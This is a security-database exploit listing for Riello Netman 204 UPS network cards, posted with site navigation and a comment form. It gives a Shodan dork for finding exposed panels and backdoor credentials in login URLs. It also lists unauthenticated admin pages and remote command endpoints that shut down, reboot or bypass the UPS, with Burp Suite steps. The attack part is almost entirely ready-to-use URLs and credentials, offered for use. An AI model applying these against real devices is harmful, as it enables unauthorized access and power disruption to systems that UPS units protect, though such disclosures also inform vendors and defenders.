---
title: Netman 204 - Broken Access Control Remote command
url: https://cxsecurity.com/issue/WLB-2025010027
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-29
fetch_date: 2025-10-06T20:05:04.189327
---

# Netman 204 - Broken Access Control Remote command

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Netman 204 - Broken Access Control Remote command** **2025.01.28**  **![ir](https://cert.cx/cxstatic/images/flags/ir.png) [parsa rezaie khiabanloo](https://cxsecurity.com/author/parsa%2Brezaie%2Bkhiabanloo/1/) **(IR)** ![ir](https://cert.cx/cxstatic/images/flags/ir.png)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A**  **[**Dork:** Shodan : Description: Netman 204](https://cxsecurity.com/dorks/)** | |

# Exploit Title: Netman 204 - Broken Access Control Remote command
# Date: 1/28/2025
# Exploit Author: parsa rezaie khiabanloo
# Vendor Homepage: netman-204 (https://www.riello-ups.com/downloads/25-netman-204)
# Version: netman-204
# Tested on: Windows/Linux
Step 1 : Attacker can using these dorks then can find the UPS panel .
Shodan : http.favicon.hash:22913038 OR https://www.shodan.io/search?query=netman+204+cgi-bin
# We Found Two panel Yellow and blue
Step 2 : For Yellow panel attacker can use these username and password because there have backdoor and for Blue panel we can use the Remote commands and burpsuite repeater to see the details of the ups .
Yellow Panel : username and password : eurek
Some exploits for that :
http://[IP]/cgi-bin/login.cgi?username=eurek&password=eurek
or
https://[IP]/cgi-bin/login.cgi?username=eurek&password=eurek
Due to flaws in parameter validation, the URL can be shortened to:
http://[IP]/cgi-bin/login.cgi?username=eurek%20eurek
or
https://[IP]/cgi-bin/login.cgi?username=eurek%20eurek
Blue Panel : username and password : admin
Some Critical leaks without authentication we can see :
http://IP/administration-commands.html
http://IP/administration.html
http://IP/administration.html#
http://IP/administration.html#LDAP
http://IP/administration.html#active-users
http://IP/administration.html#firmware-upgrade
http://IP/configuration.html
http://IP/history.html
http://IP/index.html
http://IP/login.html
http://IP/system-overview.html
http://IP/table.html
#With using up paths we can see the details of the UPS without authentication .
First open burpsuite and intercept the requests then use the up paths and after that send that request to the repeater then send it again and in your response open the render and enjoy :)
Some Remote commands without authentication :
http://IP/administration-commands.html
http://IP/administration-commands.html#
http://IP/administration-commands.html#reboot-irms
http://IP/administration-commands.html#reboot-mdu
http://IP/administration-commands.html#reboot-xts
http://IP/administration-commands.html#shutdown
http://IP/administration-commands.html#shutdown-irms
http://IP/administration-commands.html#shutdown-mdu
http://IP/administration-commands.html#shutdown-restore
http://IP/administration-commands.html#shutdown-restore-irms
http://IP/administration-commands.html#shutdown-restore-mdu
http://IP/administration-commands.html#shutdown-restore-xts
http://IP/administration-commands.html#shutdown-xts
http://IP/administration-commands.html#shutdownrestore
http://IP/administration-commands.html#switch-irms
http://IP/administration-commands.html#switch-on-bypass
http://IP/administration-commands.html#test-battery

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025010027)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top